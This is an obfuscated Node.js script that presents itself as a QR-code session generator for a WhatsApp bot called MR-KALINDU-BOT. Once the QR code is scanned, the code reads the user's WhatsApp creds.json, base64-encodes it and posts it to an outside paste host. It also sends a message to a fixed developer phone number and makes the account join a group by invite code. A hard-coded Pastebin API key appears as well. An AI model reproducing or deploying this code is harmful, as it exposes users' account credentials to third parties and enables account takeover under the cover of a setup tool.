const pino = require('pino'),
  axios = require('axios')
let qrcode = require('qrcode-terminal')
const PastebinAPI = require('pastebin-js'),
  path = require('path')
pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL')
const fs = require('fs-extra')
fs.existsSync('./auth_info_baileys') &&
  (fs.emptyDirSync(__dirname + '/auth_info_baileys'),
  require('child_process').exec('rm -rf auth_info_baileys'),
  console.log('\nRun The Script Again'),
  setTimeout(() => {
    console.log(' ')
  }, 100),
  setTimeout(() => {
    console.log('Q')
  }, 300),
  setTimeout(() => {
    console.log('R')
  }, 500),
  setTimeout(() => {
    console.log('')
  }, 700),
  setTimeout(() => {
    console.log('')
  }, 900),
  setTimeout(() => {
    console.log(' ')
  }, 1100),
  setTimeout(() => {
    console.log('')
  }, 1300),
  setTimeout(() => {
    console.log()
  }, 1500),
  setTimeout(() => {
    console.log('K')
  }, 1700),
  setTimeout(() => {
    console.log('A')
  }, 1900),
  setTimeout(() => {
    console.log('L')
  }, 2100),
  setTimeout(() => {
    console.log('I')
  }, 2300),
  setTimeout(() => {
    console.log(' ')
  }, 2500),
  setTimeout(() => {
    console.log('M')
  }, 2700),
  setTimeout(() => {
    console.log('D')
  }, 2900),
  setTimeout(() => {
    process.exit()
  }, 3000))
setTimeout(() => {
  const {
      default: _0x355e17,
      useMultiFileAuthState: _0x1b45fe,
      Browsers: _0x40e01d,
      delay: _0x585916,
      makeInMemoryStore: _0x14e60a,
    } = require('@sampandey001/baileys'),
    _0x226ecc = _0x14e60a({
      logger: pino().child({
        level: 'silent',
        stream: 'store',
      }),
    })
  async function _0x1c9454() {
    const { state: _0x5ef802, saveCreds: _0x3d9938 } = await _0x1b45fe(
      __dirname + '/auth_info_baileys'
    )
    try {
      let _0x5b7f3e = _0x355e17({
        printQRInTerminal: true,
        logger: pino({ level: 'silent' }),
        browser: _0x40e01d.macOS('Desktop'),
        auth: _0x5ef802,
      })
      _0x5b7f3e.ev.on('connection.update', async (_0x5aeb45) => {
        const {
          connection: _0x329ed7,
          lastDisconnect: _0x533839,
          qr: _0x30a503,
        } = _0x5aeb45
        if (_0x329ed7 == 'open') {
          await _0x585916(500)
          let _0x3f84f2 = _0x5b7f3e.user.id
          var _0x14a1c3 = ''
          try {
            let _0x1138f3 = await fs.readFileSync(
              __dirname + '/auth_info_baileys/creds.json',
              'utf-8'
            )
            await _0x585916(800)
            const _0x19a211 = await axios.post(
              'http://paste.c-net.org/',
              '' + btoa(_0x1138f3),
              {
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                },
              }
            )
            _0x14a1c3 = _0x19a211.data.split('/')[3]
            await _0x585916(500)
            let _0x44176e = await _0x5b7f3e.sendMessage(_0x3f84f2, {
              text: 'MR-KALINDU;;;' + _0x14a1c3,
            })
            await _0x5b7f3e.sendMessage('94758179948@s.whatsapp.net', {
              text: '*彡[ YOUR-BOT QR SCAN COMPLETED SUCCESFULY \u2705. ]彡*',
            })
          } catch (_0x511f15) {
            console.log(_0x511f15)
          }
          let _0x696c56 = fs.readFileSync(
            __dirname + '/auth_info_baileys/creds.json'
          )
          c = Buffer.from(_0x696c56).toString('base64')
          console.log(
            '\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550  SESSION ID 1  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557                   \nSESSION-ID 1 ==> ' +
              c +
              "\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550  SESSION ID 2  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557 \nSESSION-ID 2 => ' " +
              _0x14a1c3 +
              "\n\nDon't provide your SESSION_ID to anyone otherwise that user can access your account.\nThanks.\n\u2505\u2505\u2505\u2505\u2505\u2505-   SESSION CLOSED   \u2505\u2505\u2505\u2505\u2505\u2505\u2505\u2505\n"
          )
          await _0x5b7f3e.groupAcceptInvite('LkP8QZqdhXUKxmc0hUPip5')
          let _0x4c9a87 =
              "🛸 *ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴄʜᴏᴏꜱɪɴɢ ᴍʀ-ᴋᴀʟɪɴᴅᴜ-ʙᴏᴛ* 🛸\n\n🍀 *Qʀ ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴍʀ-ᴋᴀʟɪɴᴅᴜ*🍀\n\n🇱🇰 *ʏᴏᴜ ᴄᴏᴍᴘʟᴇᴀᴛᴇᴅ ꜰɪʀꜱᴛ ꜱᴛᴇᴘ ᴏꜰ ᴄʀᴇᴀᴛɪɴɢ ᴍʏ ʙᴏᴛ* 🇱🇰\n\n♨️ *ᴀꜱ ꜱᴏᴏɴ ᴀꜱ ʏᴏᴜ ꜱᴄᴀɴ ᴛʜᴇ Qʀ ᴄᴏᴅᴇ,ʏᴏᴜ ᴡɪʟʟ ʙᴇ ᴀᴅᴅᴇᴅ ᴛᴏ ᴏᴜʀ ꜱᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ. ᴘʟᴇᴀꜱᴇ ᴅᴏ ɴᴏᴛ ʟᴇᴀᴠᴇ ᴛʜᴇ ɢʀᴏᴜᴘ* ♨️\n\n🐝 *ᴅᴏɴ'ᴛ ꜱʜᴀʀᴇ ʏᴏᴜʀ ꜱᴇꜱꜱɪᴏɴ ɪᴅ. ᴏᴛʜᴇʀᴡɪꜱᴇ ᴄᴀɴ ᴀᴄᴄꜱᴇꜱ ʏᴏᴜ ᴀᴄᴄᴏᴜɴᴛ* 🐝\n\n🙄 *ᴅᴏɴᴛ ᴛʀʏ ᴄʀᴇᴀᴛᴇ Qʀ ꜰᴏʀ ᴜꜱɪɴɢ ᴍʏ ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ ᴄᴏᴅᴇ* 🙄\n\n🐞 *ᴅᴇᴠᴇʟᴏᴘᴇʀ ɴᴜᴍʙᴇʀ* 🐞\n\n̸ͪ⫷_________________________⫸\n+94758179948\n⫷_________________________⫸",
            _0x261ef1 = await _0x5b7f3e.sendMessage(_0x3f84f2, {
              text: 'MR-KALINDU;;;' + c,
            })
          await _0x5b7f3e.sendMessage(
            _0x3f84f2,
            { text: _0x4c9a87 },
            { quoted: _0x261ef1 }
          )
          await require('child_process').exec('rm -rf auth_info_baileys')
          process.exit(1)
        }
        _0x5b7f3e.ev.on('creds.update', _0x3d9938)
        _0x329ed7 === 'close' &&
          _0x533839 &&
          _0x533839.error &&
          _0x533839.error.output.statusCode != 401 &&
          _0x1c9454()
      })
    } catch (_0x53aa62) {
      console.log(_0x53aa62)
      await require('child_process').exec('rm -rf auth_info_baileys')
      process.exit(1)
    }
  }
  _0x1c9454()
}, 3000)
